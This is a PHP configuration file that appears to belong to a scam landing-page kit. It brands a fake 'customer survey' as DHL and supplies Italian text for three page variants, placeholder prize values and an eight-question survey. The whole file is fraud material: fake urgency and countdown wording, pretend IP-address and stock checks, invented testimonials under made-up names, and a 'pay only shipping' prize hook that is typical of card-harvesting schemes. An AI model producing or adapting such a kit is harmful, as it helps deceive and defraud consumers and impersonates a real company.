<?php

// product
$product = "asdasd";
$description = "asdasd";
$price = "asdasd";
$productImage = "/templates/products/gcart (2).png";
$commentImage1 = "/templates/products/download.png";
$commentImage2 = "/templates/products/gcart_comm1 (1).png";
$wallID = "213123asdaw";

// brand
$name = "DHL";
$brandLogo = "/templates/brands/zcjtl3l9qt8.png";
$favicon = "/templates/brands/9jdolr41085.gif";
$backgroundImage = "/templates/brands/wqu2jysi9ym.gif";
$mainColor = "rgb(212,5,17)";
$secondaryColor = "rgb(255,204,0)";
$headerColor = "rgb(255,204,0)";
$white = "true";

// geo
$geo = "uk";
$langTag = "it";
$currency = "$";
$commentName1 = "Lyla Adams";
$commentName2 = "Hudson Wilson";
$commentName3 = "Ivy Lewis";
$commentName4 = "Colton Walker";
$commentName5 = "Hazel Harris";
$profilePic1 = "/templates/geos/1_uk.jpg";
$profilePic2 = "/templates/geos/2_uk.jpg";
$profilePic3 = "/templates/geos/3_uk.jpg";
$profilePic4 = "/templates/geos/4_uk.jpg";
$profilePic5 = "/templates/geos/5_uk.jpg";
$flagLogo = "/templates/geos/flaglogo_uk.png";

// texts
$texts = [
    "tryetco" => [
        "title" => "Richieste di Sondaggi",
        "text1" => "Oltre 4.000.000 di offerte distribuite finora!",
        "text2" => "Sondaggio Su",
        "text3" => "Gentile acquirente DHL,",
        "text4" => "Vorremmo offrirti un&#x27;opportunità unica di ricevere un nuovissimo",
        "text5" => "Per rivendicarlo, basta compilare questo breve sondaggio sulla tua esperienza con",
        "text6" => "Attenzione!",
        "text7" => "Questa offerta di sondaggio scade oggi,",
        "text8" => "AVVIA IL SONDAGGIO",
        "text9" => "Attendere mentre elaboriamo le tue risposte...",
        "text10" => "Invio delle risposte...",
        "text11" => "Controllo per duplicati di indirizzi IP...",
        "text12" => "Controllo del nostro inventario per prodotti...",
        "text13" => "Congratulazioni...",
        "text14" => "Risposte inviate",
        "text15" => "Indirizzo IP verificato",
        "text16" => "Prodotti disponibili in magazzino",
        "text17" => "Grazie per aver completato il sondaggio!",
        "text18" => "Poiché hai contribuito a fornire dati di consumo estremamente preziosi, ora puoi scegliere alcuni dei seguenti premi esclusivi qui sotto.",
        "text19" => "Si prega di notare che se lasci questa pagina senza rivendicare il tuo premio, non abbiamo altra scelta che dare ad un altro visitatore la possibilità di partecipare al nostro programma di premi.",
        "text20" => "Prezzo:",
        "text21" => "Disponibilità:",
        "text22" => "Paghi solo le spese di spedizione!",
        "text23" => "RIVENDICA IL PREMIO",
        "text24" => "Nuovo Commento",
        "text25" => "Commenti (5)",
        "text26" => "Invia",
        "text27" => "Ho appena ricevuto questo tramite e-mail e l&#x27;ho provato. Sono entusiasta di ottenere il mio premio! Posso anche inviare il sondaggio ai miei amici?",
        "text28" => "In realtà ho ottenuto un premio da questo sondaggio! All&#x27;inizio ero scettico, ma ho provato. E guarda cosa è appena arrivato per posta!",
        "text29" => "Beh, un sondaggio così fantastico, ma troppo male non ho ottenuto nessun premio.. ",
        "text30" => "Di solito non faccio questo tipo di sondaggi online, ma questo è davvero uno buono!! Metteremo questo premio a buon uso, grazie mille!!",
        "text31" => "Dove posso fare altri sondaggi come questi? Mi piace ottenere premi :)",
        "text32" => "Questo sito web non è affiliato o sponsorizzato da DHL o da marchi simili e non pretende di rappresentare o possedere marchi, nomi commerciali o diritti relativi a nessuno dei prodotti di proprietà dei rispettivi proprietari, che non possiedono, sponsorizzano o promuovono questo sito web.",
        "text33" => "*I prodotti offerti nell&#x27;ultima pagina richiedono spese di spedizione e imballaggio. Consultare il sito del produttore per i dettagli, in quanto i termini variano con le offerte. Consultare i termini e le condizioni importanti riguardanti questo sondaggio, sito web e pubblicità.",
        "text34" => "*Importante: Possono essere applicate spese di spedizione.",
        "text35" => "L&#x27;offerta scade in",
        "text36" => "Congratulazioni!",
        "text37" => "Abbiamo riservato (1)",
        "text38" => "esclusivamente per te.",
        "text39" => "Come rivendicare il tuo",
        "text40" => "Inserisci il tuo indirizzo di spedizione.",
        "text41" => "Paga solo le spese di spedizione per ricevere il tuo premio.",
        "text42" => "Il tuo premio sarà consegnato entro 5-7 giorni lavorativi.",
        "text43" => "Continua",
        "like" => "Mi piace",
        "reply" => "Rispondi",
        "montharray" => "Gennaio, Febbraio, Marzo, Aprile, Maggio, Giugno, Luglio, Agosto, Settembre, Ottobre, Novembre, Dicembre",
    ],
    "walp" => [
        "text1" => "Offerta Esclusiva",
        "text4" => "AVVIA IL SONDAGGIO",
        "surveyTitle" => "Aiutaci a migliorare la tua esperienza di shopping",
        "question" => "Domanda",
        "totalQuestions" => "8 domande in totale",
        "text6" => "Elaborazione della tua risposta",
        "text7" => "Attendere mentre verifichiamo la tua idoneità...",
        "text8" => "Congratulazioni!",
        "text10" => "SCORTE LIMITATE",
        "text11" => "Prezzo normale:",
        "text12" => "Il tuo prezzo:",
        "text13" => "Paga solo spedizione e spese di gestione",
        "text14" => "Rendi presente il tuo premio ora",
        "text15" => "L&#x27;offerta scade in:",
        "text16" => "Recenti commenti:",
        "text17" => "2 ore fa",
        "verified" => "Verificato",
        "text18" => "Ho appena ricevuto questo tramite e-mail e l&#x27;ho provato. Sono entusiasta di ottenere il mio premio! Posso anche inviare il sondaggio ai miei amici?",
        "text19" => "8 ore fa",
        "text20" => "In realtà ho ottenuto un premio da questo sondaggio! All&#x27;inizio ero scettico, ma ho provato. E guarda cosa è appena arrivato per posta!",
        "text21" => "1 giorno fa",
        "text22" => "Beh, un sondaggio così fantastico, ma troppo male non ho ottenuto nessun premio.. ",
        "text23" => "1 giorno fa",
        "text24" => "Nuovo Commento!",
        "text25" => "1 giorno fa",
        "commentt" => "Dove posso fare altri sondaggi come questi? Mi piace ottenere premi!",
        "text27" => "Informativa sulla privacy",
        "text28" => "Termini di servizio",
        "text29" => "Contattaci",
        "text31" => "*Importante: Possono essere applicate spese di spedizione.",
        "title" => "Sondaggio Clienti",
        "one" => "Risposte Inviate",
        "two" => "Controllo Indirizzo IP",
        "three" => "Controllo Disponibilità Prodotto",
        "four" => "Verifica Idoneità",
        "five" => "Preparazione del premio",
        "send" => "Invia",
        "questionCount1" => 'Domanda 1 su 8',
        "questionCount2" => 'Domanda 2 su 8',
        "questionCount3" => 'Domanda 3 su 8',
        "questionCount4" => 'Domanda 4 su 8',
        "questionCount5" => 'Domanda 5 su 8',
        "questionCount6" => 'Domanda 6 su 8',
        "questionCount7" => 'Domanda 7 su 8',
        "questionCount8" => 'Domanda 8 su 8',
        "text2" => "Vinci un asdasd!",
        "text5" => "Cosa dicono i clienti di questo prodotto",
        "text3" => "Condividi la tua esperienza di acquisto con DHL e vinci un asdasd del valore di oltre $asdasd.",
        "text9" => "Sei stato selezionato per ricevere un asdasd",
        "text30" => "Questo sito web non è affiliato o sponsorizzato da DHL o da marchi simili e non pretende di rappresentare o possedere marchi, nomi commerciali o diritti relativi a nessuno dei prodotti di proprietà dei rispettivi proprietari, che non possiedono, sponsorizzano o promuovono questo sito web. *I prodotti offerti nell&#x27;ultima pagina richiedono spese di spedizione e imballaggio. Consultare il sito del produttore per i dettagli, in quanto i termini variano con le offerte. Consultare i termini e le condizioni importanti riguardanti questo sondaggio, sito web e pubblicità.",
        "feature1" => "Design innovativo per un&#x27;esperienza utente superiore.",
        "feature2" => "Prestazioni e affidabilità eccezionali.",
        "feature3" => "Integrazione senza sforzo con i sistemi esistenti.",
        "review1" => "Questo prodotto è fantastico! Sono rimasto piacevolmente sorpreso dalla qualità e dalla facilità d&#x27;uso. Assolutamente consigliato!",
        "review2" => "Adoro questo prodotto! È esattamente quello che cercavo e ha superato le mie aspettative. Un ottimo acquisto!",
        "review3" => "Questo articolo è meraviglioso. Funziona perfettamente ed è molto ben progettato. Cinque stelle!",
    ],
    "hrblock" => [
        "title" => "[1] Premio in sospeso - Vogliamo il tuo parere!",
        "text2" => "Oltre 4.000.000 di offerte finora distribuite!",
        "text3" => "Sondaggio indipendente su",
        "text4" => "CONGRATULAZIONI!",
        "text5" => "Sei stato scelto per l&#x27;opportunità di ricevere un nuovissimo",
        "text7" => "Per avere la possibilità di rivendicare il tuo premio, rispondi ad alcune domande sulla tua esperienza con",
        "text8" => "Attenzione: Questa offerta scade oggi",
        "text9" => "AVVIA IL SONDAGGIO",
        "text10" => "Elaborazione",
        "text11" => "Attendere mentre elaboriamo le tue risposte...",
        "text12" => "Risposte inviate",
        "text13" => "Controllo indirizzo IP",
        "text14" => "Prodotti disponibili in magazzino",
        "text15" => "Completa",
        "text16" => "GRAZIE PER AVER COMPLETATO IL NOSTRO SONDAGGIO!",
        "text17" => "Scegli (1) premio esclusivo.",
        "text18" => "Non lasciare questa pagina perché i prodotti sono limitati.",
        "text19" => "Buono sconto riscattato con successo",
        "text20" => "Disponibilità:",
        "text21" => "La tua opportunità:",
        "text22" => "Prezzo normale:",
        "text23" => "LO PRENDO!",
        "text24" => "Paga solo la spedizione",
        "text25" => "Scade in:",
        "text26" => "Recenti commenti:",
        "text27" => "Invia",
        "text28" => "14 ore fa",
        "text29" => "Ho ottenuto un premio da questo sondaggio! All&#x27;inizio ero un po&#x27; scettico, ma ho corso un rischio e ho vinto!!",
        "text30" => "8 ore fa",
        "text31" => "Ho appena ricevuto questo per posta e l&#x27;ho provato. Sono entusiasta di ottenere il mio premio, posso inviare il sondaggio anche ai miei amici?",
        "text32" => "1 giorno fa",
        "text33" => "Ho fatto il sondaggio ma non ho ricevuto alcun premio questa volta..",
        "text34" => "1 giorno fa",
        "text36" => "2 giorni fa",
        "text37" => "Ho ricevuto il mio premio da questo sondaggio oggi!! Sorpresa piacevole, lo consiglio sicuramente ai miei amici",
        "text38" => "Informativa sulla privacy",
        "text39" => "Termini e condizioni",
        "text40" => "QUESTO È UN SONDAGGIO INDIPENDENTE. Questo sito web non è affiliato o sponsorizzato da, e non pretende di possedere alcun marchio, nome commerciale o diritto relativi a nessuno dei prodotti di proprietà dei rispettivi proprietari, che non possiedono, sponsorizzano o promuovono questo sito web. * I prodotti campione offerti nell&#x27;ultima pagina richiedono spese di spedizione e imballaggio. Consultare il sito del produttore per i dettagli, in quanto i termini variano con le offerte. Si prega di esaminare i termini e le condizioni importanti relativi a questo sondaggio, sito e pubblicità.",
        "text41" => "",
        "montharray" => "Gennaio, Febbraio, Marzo, Aprile, Maggio, Giugno, Luglio, Agosto, Settembre, Ottobre, Novembre, Dicembre",
        "verified" => "Verificato",
        "notverified" => "Non verificato"
    ]
];


$survey = array(
    array("Con quanta frequenza utilizzi DHL per le tue spedizioni?", "Più volte a settimana", "Una volta a settimana", "Diverse volte al mese", "Raramente o mai"),
    array("Cosa guida principalmente la tua scelta di utilizzare DHL?", "Convenienza della consegna", "Velocità di spedizione", "Prezzi e offerte", "Programmi fedeltà"),
    array("Quando vedi gli annunci di DHL, come di solito reagisci?", "Cerco articoli di cui ho bisogno", "Cerco se c&#x27;è una buona offerta", "Considero di usarli se c&#x27;è una promozione", "Di solito ignoro gli annunci"),
    array("Se vincessi un asdasd da DHL, come cambierà la tua opinione su DHL?", "Significativamente più positivo", "Un po&#x27; più positivo", "Nessun cambiamento", "Più negativo"),
    array("Per quanto riguarda l&#x27;asdasd, quale caratteristica è più attraente per te?", "Resistenza", "Funzionalità", "Portabilità", "Design e aspetto"),
    array("Quanto è probabile che tu utilizzi un prodotto spedito da DHL se hai ricevuto un asdasd?", "Molto probabile", "Abbastanza probabile", "Improbabile", "Non lo userei"),
    array("Per quanto riguarda la velocità di spedizione, quanto bene credi che DHL soddisfi le tue esigenze?", "Supera le mie esigenze", "Soddisfa bene le mie esigenze", "Soddisfa adeguatamente le mie esigenze", "Non soddisfa le mie esigenze"),
    array("Quanto è probabile che tu partecipi a future promozioni o sondaggi di DHL?", "Molto probabile", "Abbastanza probabile", "Non molto probabile", "Per nulla probabile"),
);

?>